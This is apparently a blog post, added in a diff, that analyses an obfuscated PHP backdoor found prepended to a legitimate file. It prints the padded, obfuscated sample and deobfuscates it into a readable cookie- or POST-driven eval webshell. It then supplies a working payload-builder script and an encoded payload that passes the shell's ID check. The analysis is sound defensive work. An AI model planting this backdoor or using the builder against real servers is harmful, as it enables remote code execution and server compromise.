@@ -1,0 +1,351 @@
+---
+layout: default
+title: Obfuscated PHP Backdoor script analysis 2
+date: 2018-08-09
+categories: 
+    - "php"
+    - "obfuscation"
+---
+
+[home](/)
+
+# {{ page.title }}
+
+Embedded backdoor found prepended onto an existing valid .php file.
+
+The script is rather large, so I have cut out some of the string
+concatenation parts.
+
+Check pastebin link for full source \[link\]
+```php
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $gb2407 = 578;$GLOBALS['rb22c05fb'] = Array();global $rb22c05fb;$rb22c05fb = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['f884b'] = "\x6e\x25\x6f\x3a\x7a\x34\x4a\x27\x62\x38\x47\x3f\x6d\x45\x73\x37\x2f\x3c\x52\x28\x71\x66\x69\x2d\x50\x75\x53\xa\x78\x77\x68\x2b\x9\x5d\x51\x6b\x3e\x2e\x5a\x67\x49\x7c\x60\x61\x5b\x7b\x46\x4c\x22\x4f\x42\x26\x31\x58\x4d\x44\x6c\x7d\x63\x59\x23\x5c\x29\x32\x7e\xd\x40\x3d\x5e\x76\x30\x5f\x33\x21\x4b\x4e\x56\x6a\x65\x74\x43\x57\x79\x35\x41\x39\x2a\x24\x64\x55\x72\x3b\x20\x2c\x36\x48\x54\x70";$rb22c05fb[$rb22c05fb['f884b'][69].$rb22c05fb['f884b'][78].$rb22c05fb['f884b'][83].$rb22c05fb['f884b'][9].$rb22c05fb['f884b'][88].$rb22c05fb['f884b'][83].$rb22c05fb['f884b'][5].$rb22c05fb['f884b'][72].$rb22c05fb['f884b'][63]] = $rb22c05fb['f884b'][58].$rb22c05fb['f884b'][30].$rb22c05fb['f884b'][90];$rb22c05fb[$rb22c05fb['f884b'][12].$rb22c05fb['f884b'][85].$rb22c05fb['f884b'][63].$rb22c05fb['f884b'][85].$rb22c05fb['f884b'][9]] = $rb22c05fb['f884b'][2].$rb22c05fb['f884b'][90].$rb22c05fb['f884b'][88];$rb22c05fb[$rb22c05fb['f884b'][20].$rb22c05fb['f884b'][5].$rb22c05fb['f884b'][94].$rb22c05fb['f884b'][88].$rb22c05fb['f884b'][52].$rb22c05fb['f884b'][43].$rb22c05fb['f884b'][83].$rb22c05fb['f884b'][21].$rb22c05fb['f884b'][52]] = $rb22c05fb['f884b'][14].$rb22c05fb['f884b'][79].$rb22c05fb['f884b'][90].$rb22c05fb['f884b'][56].$rb22c05fb['f884b'][78].$rb22c05fb['f884b'][0];$rb22c05fb[$rb22c05fb['f884b'][21].$rb22c05fb['f884b'][8].$rb22c05fb['f884b'][52].$rb22c05fb['f884b'][85].$rb22c05fb['f884b'][83].$rb22c05fb['f884b'][9]] = 
+-------------------- -------------------- SNIP -------------------- -------------------- 
+84b'][9].$rb22c05fb['f884b'][21]] = $_COOKIE;@$rb22c05fb[$rb22c05fb['f884b'][21].$rb22c05fb['f884b'][8].$rb22c05fb['f884b'][52].$rb22c05fb['f884b'][85].$rb22c05fb['f884b'][83].$rb22c05fb['f884b'][9]]($rb22c05fb['f884b'][78].$rb22c05fb['
+-------------------- -------------------- SNIP -------------------- -------------------- 
+'][43].$rb22c05fb['f884b'][78].$rb22c05fb['f884b'][21];global $x864b367c;function  r6971a($e76477, $qead07){global $rb22c05fb;$e112aa2d = "";for ($n28c=0; 
+-------------------- -------------------- SNIP -------------------- -------------------- 
+b'][21].$rb22c05fb['f884b'][52]]($e76477);){for ($o70350cf=0; 
+-------------------- -------------------- SNIP -------------------- -------------------- 
+$qead07){global $rb22c05fb;global $x864b367c;return 
+-------------------- -------------------- SNIP -------------------- -------------------- 
+3]]($e76477, $x864b367c), $qead07);}foreach ($rb22c05fb[$rb22c05fb['f884b'][56].$rb22c05fb['f884b'][43].$rb22c05fb['f884b'][83].$rb22c05fb['f884b'][58].$rb22c05fb['f884b'][85].$rb22c05fb['f884b'][72].$rb22c05fb['f884b'][72].$rb22c05fb['f884b'][9].$rb22c05fb['f884b'][21]] as $qead07=>$l0c59b){$e76477 = $l0c59b;$k93f152 = $qead07;}if (!$e76477){foreach
+-------------------- -------------------- SNIP -------------------- -------------------- 
+['f884b'][63].$rb22c05fb['f884b'][58].$rb22c05fb['f884b'][52].$rb22c05fb['f884b'][70].$rb22c05fb['f884b'][5]]($e76477), $k93f152));if (isset($e76477[$rb22c05fb['f884b'][43].$rb22c05fb['f884b'][35]]) && $x864b367c==$e76477[$rb22c05fb['f884b'][43].$rb22c05fb['f884b'][35]]){if ($e76477[$rb22c05fb['f884b'][43]] == $rb22c05fb['f884b'][22]){$n28c = Array($rb22c05fb['f884b'][97].$rb22c05fb['f884b'][69] => @$rb22c05fb[$rb22c05fb['f884b'][12].$rb22c05fb['f884b'][63].$rb22c05fb['f884b'][9].$rb22c05fb['f884b
+$rb22c05fb['f884b'][52].$rb22c05fb['f884b'][37].$rb22c05fb['f884b'][70].$rb22c05fb['f884b'][23].$rb22c05fb['f884b'][52],);echo @$rb22c05fb[$rb22c05fb['f884b'][88].$rb22c05fb['f884b'][70].$rb22c05fb['f884b'][63].$rb22c05fb['f884b'][70].$rb22c05fb['f884b'][15].$rb22c05fb['f884b'][43].$rb22c05fb['f884b'][15].$rb22c05fb['f884b'][5]]($n28c);}elseif ($e76477[$rb22c05fb['f884b'][43]] == $rb22c05fb['f884b'][78]){eval/*v4c8*/($e76477[$rb22c05fb['f884b'][88]]);}exit();} ?>
+```
+
+At first glance there's a couple of things to notice:
+
+-   The script is all in one line, with a full "page" of space at the
+    beginning, likely in attempt to go unnoticed in a text editor
+    without word wrap.
+-   It is highly obfuscated.
+-   The "global" keyword can be seen used alot of places.
+-   Once again the use of the \$\_COOKIE superglobal can be observed.
+-   The "eval" function is at the end, separated by a /\* \*/ comment
+    block, likely in an attempt to hide from automated detection.
+
+Next let's go ahead and add some quick linebreaks and indentation, to
+make it abit more readable:
+
+![](/Pictures/PHP02_01.png)
+
+We can now begin to see some structure and a pattern used in alot of
+these obfuscators, specifically the use initializing a string, and
+creating a an array based of offsets in this string.
+
+It is now possible to get an idea of whats going on:
+
+-   Most of the obfuscation evolves around an array being initialized
+    from a specific string of characters concatenated by offset. The
+    array is made as a global.
+-   The main initializing string is written in hex, including the array
+    key name.
+-   Just below the array is what seems to be some function calls, using
+    the "@" error suppression operator.
+-   A couple of functions are defined, a foreach loop and then a couple
+    of conditions is checked, where the latter at some point calls the
+    "eval" function. (also note the use of "echo" - so we might get some
+    response from this script!)
+
+Lets dump \$GLOBALS, to see what it contains after assignment:
+
+```php
+array(24) {
+  ["_GET"]      =>  array(0) {  }
+  ["_POST"]     =>  array(0) {  }
+  ["_COOKIE"]   =>  array(0) {  }
+  ["_FILES"]    =>  array(0) {  }
+  ["GLOBALS"]   =>  array(24) { *RECURSION* }
+  ["gb2407"]    =>  int(578)
+  ["rb22c05fb"] =>  array(24) { *RECURSION* }
+  ["e76477"]    =>  NULL
+  ["k93f152"]   =>  NULL
+  ["f884b"]     =>  string(98) "n%o:z4J'b8G?mEs7/<R(qfi-PuSxwh+	]Qk>.ZgI|`a[{FL\"OB&1XMDl}cY#\)2~@=^v0_3!KNVjetCWy5A9*$dUr; ,6HTp"
+  ["ve58d5432"] =>  string(3) "chr"
+  ["m9298"]     =>  string(3) "ord"
+  ["q46d1a5f1"] =>  string(6) "strlen"
+  ["fb1958"]    =>  string(7) "ini_set"
+  ["d0207a74"]  =>  string(9) "serialize"
+  ["m28921c1"]  =>  string(10) "phpversion"
+  ["pc4fb4"]    =>  string(11) "unserialize"
+  ["l432c104"]  =>  string(13) "base64_decode"
+  ["a518b496"]  =>  string(14) "set_time_limit"
+  ["tdab3b"]    =>  string(8) "b6ddf34f"
+  ["ka7b4d65"]  =>  string(6) "r6971a"
+  ["f2a1a8fff"] =>  array(0) {  }     // $_POST;
+  ["la5c9338f"] =>  array(0) {  }     // $_COOKIE
+  ["x864b367c"] =>  string(36) "d4a8745e-2599-49bc-b7e3-2b194ca49aef"
+}
+```
+
+As expected we can now see following:
+
+-   "gb2407": An int (578) - Possibly a counter or build number? (It
+    does not seem to be used, but could be retrieved with a successful
+    payload)
+-   \"f884b\" : Inner concat reference string for generating the ID in
+    "x864b367c"
+-   Multiple PHP function names.
+-   References to \$\_POST & \$\_COOKIE.
+-   \"x864b367c\": ID generated from "f884b"
+
+Next step is to do some search/replace on all the string concatenations,
+replacing them with the corresponding resolved value:
+
+```php
+global $x864b367c;
+function  r6971a($e76477, $qead07){
+	global $rb22c05fb;
+	$e112aa2d = "";
+	for ($n28c=0; $n28c<$rb22c05fb['q46d1a5f1']($e76477);){
+		for ($o70350cf=0; $o70350cf<$rb22c05fb['q46d1a5f1']($qead07) && $n28c<$rb22c05fb['q46d1a5f1']($e76477);$o70350cf++, $n28c++){
+            $e112aa2d .= $rb22c05fb['ve58d5432']($rb22c05fb['m9298']($e76477[$n28c]) ^ $rb22c05fb['m9298']($qead07[$o70350cf]));
+        }
+    }
+    return $e112aa2d;
+}
+
+function  b6ddf34f($e76477, $qead07){
+    global $rb22c05fb;
+    global $x864b367c;
+    return $rb22c05fb['ka7b4d65']($rb22c05fb['ka7b4d65']($e76477, $x864b367c), $qead07);
+}
+
+foreach ($rb22c05fb['la5c9338f'] as $qead07=>$l0c59b){
+    $e76477 = $l0c59b;
+    $k93f152 = $qead07;
+}
+
+if (!$e76477){
+    foreach ($rb22c05fb['f2a1a8fff'] as $qead07=>$l0c59b){
+        $e76477 = $l0c59b;
+        $k93f152 = $qead07;
+    }
+}
+
+$e76477 = @$rb22c05fb['pc4fb4']($rb22c05fb['tdab3b']($rb22c05fb['l432c104']($e76477), $k93f152));
+
+if (isset($e76477['ak']) && $x864b367c==$e76477['ak']){
+    if ($e76477[$rb22c05fb['f884b'][43]] == $rb22c05fb['f884b'][22]){
+        $n28c = Array('pv' => @$rb22c05fb['m28921c1'](),'sv' => '1.0-1',);
+        echo @$rb22c05fb['d0207a74']($n28c);
+    }
+    elseif ($e76477[$rb22c05fb['f884b'][43]] == $rb22c05fb['f884b'][78]){
+        eval/*v4c8*/($e76477[$rb22c05fb['f884b'][88]]);
+    }
+    exit();
+}
+```
+
+Without spending too much time on this stage, lets go ahead and replace
+array references to proper value where possible:
+
+```php
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@set_time_limit(0);
+
+global $x864b367c;
+function  r6971a($e76477, $qead07){
+	global $rb22c05fb;
+	$e112aa2d = "";
+	for ($n28c=0; $n28c<strlen($e76477);){
+		for ($o70350cf=0; $o70350cf<strlen($qead07) && $n28c<strlen($e76477);$o70350cf++, $n28c++){
+            $e112aa2d .= chr(ord($e76477[$n28c]) ^ ord($qead07[$o70350cf]));
+        }
+    }
+    return $e112aa2d;
+}
+
+function  b6ddf34f($e76477, $qead07){
+    global $rb22c05fb;
+    global $x864b367c;
+    return r6971a(r6971a($e76477, $x864b367c), $qead07);
+}
+
+foreach ($_COOKIE as $qead07=>$l0c59b){
+    $e76477 = $l0c59b;
+    $k93f152 = $qead07;
+}
+
+if (!$e76477){
+    foreach ($_POST as $qead07=>$l0c59b){
+        $e76477 = $l0c59b;
+        $k93f152 = $qead07;
+    }
+}
+
+$e76477 = @unserialize(b6ddf34f(base64_decode($e76477), $k93f152));
+
+if (isset($e76477['ak']) && $x864b367c==$e76477['ak']){
+    if ($e76477['a'] == 'i'){
+        $n28c = Array('pv' => @phpversion(),'sv' => '1.0-1',);
+        echo @serialize($n28c);
+    }
+    elseif ($e76477['a'] == 'e'){
+        eval/*v4c8*/($e76477['d']);
+    }
+    exit();
+}
+```
+
+
+Finally lets go ahead and do some rewriting and commenting, to get the
+complete view of what is going on.
+
+```php
+<?php
+
+// Prevents all errors and set unlimited execution time
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@set_time_limit(0);
+
+// This is just a repeating XOR cipher, repeating cipherKey to length of text
+function  repXOR($text, $cipherKey){
+    $xorStr = "";
+    for ($x = 0; $x < strlen($text);){
+	for ($i = 0; $i < strlen($cipherKey) && $x < strlen($text); $i++, $x++){
+            $xorStr .= chr(ord($text[$x]) ^ ord($cipherKey[$i]));
+        }
+    }
+    return $xorStr;
+}
+
+// Initialize primary variables
+$key = NULL;
+$value = NULL;
+
+// Iterate all $_COOKIE key => value, setting $value & $key, overwriting if multiple
+foreach ($_COOKIE as $cKey => $cVal){
+    $value = $cVal;
+    $key = $cKey;
+}
+
+// If no $_COOKIE was present, try all $_POST, again overwriting if multiple
+if (!$value){
+    foreach ($_POST as $pKey => $pVal){
+        $value = $pVal;
+        $key = $pKey;
+    }
+}
+
+/*
+    Decode $payload
+    1. Base64 decode 
+    2. First XOR pass using provided ID
+    3. Second XOR pass using provided key name from $_COOKIE or $_POST
+    4. Unserialize it
+*/
+$payload = @base64_decode($value);
+$payload = @repXOR($payload, 'd4a8745e-2599-49bc-b7e3-2b194ca49aef');
+$payload = @repXOR($payload, $key);
+$payload = @unserialize($payload);
+
+/*
+    // Payload requires ID
+    $payload['ak'] => 'd4a8745e-2599-49bc-b7e3-2b194ca49aef',
+    // Show info
+    $payload['a'] => 'i',
+    // Eval code
+    $payload['a'] => 'e',
+    $payload['d'] => 'echo \"Hi\";'
+*/
+if (isset($payload['ak']) && 'd4a8745e-2599-49bc-b7e3-2b194ca49aef' == $payload['ak']){
+    // if $payload['a'] == 'i' respond with php version and "backdoor" version, serialized
+    if ($payload['a'] == 'i'){
+        $info = Array(
+	    'pv' => @phpversion(),
+	    'sv' => '1.0-1',
+	);
+        echo @serialize($info);
+    // if $payload['a'] == 'e', then evaluate code in $payload['d']
+    } elseif ($payload['a'] == 'e'){
+        eval($payload['d']);
+    }
+    exit();
+}
+
+```
+
+So, to be able to generate a valid payload, something like this would
+do:
+
+```php
+<?php
+function  repXOR($text, $cipherKey){
+	$xorStr = "";
+	for ($x = 0; $x < strlen($text);){
+		for ($i = 0; $i < strlen($cipherKey) && $x < strlen($text); $i++, $x++){
+            $xorStr .= chr(ord($text[$x]) ^ ord($cipherKey[$i]));
+        }
+    }
+    return $xorStr;
+}
+
+$payload = [
+    // ID is required
+    'ak' => 'd4a8745e-2599-49bc-b7e3-2b194ca49aef',
+    // show info
+//    'a' => 'i',
+    // or execute code
+    'a' => 'e',
+    'd' => "echo \"Hi\";"
+];
+// set key name
+$payloadKeyName = "payload";
+// set ID
+$payloadID = "d4a8745e-2599-49bc-b7e3-2b194ca49aef";
+
+// 1. Serialize it
+$payload = serialize($payload);
+// 2. XOR with key name
+$payload = repXOR($payload, $payloadKeyName);
+// 3. XOR with ID
+$payload = repXOR($payload, $payloadID);
+// 4. base64 encode
+$finishedPayload = base64_encode($payload);
+
+```
+
+Finished payload ready to be sent, executing "echo "Hi";"
+
+```php
+Array
+(
+    [payload] => dW8rbiMmayd2aTg9enI3Yig5eCE3ITNsaTllOGkwLWFvLTUvZy4gNWE1dilmPGthaT40dDdtKWBlPzl7bDl3KHchfmFpPzdiP2N9Y2J+dnhjZidneH53d2hhIX12QH0KOlpjY280cw==
+)
+```
+
+VirusTotal was not amazing on this one, which can be understandable
+based on hash recognition, but I had expected a tad more from the
+heuristics.
+
+![](/Pictures/PHP02_02.png)
+
+
+[back](/)
+
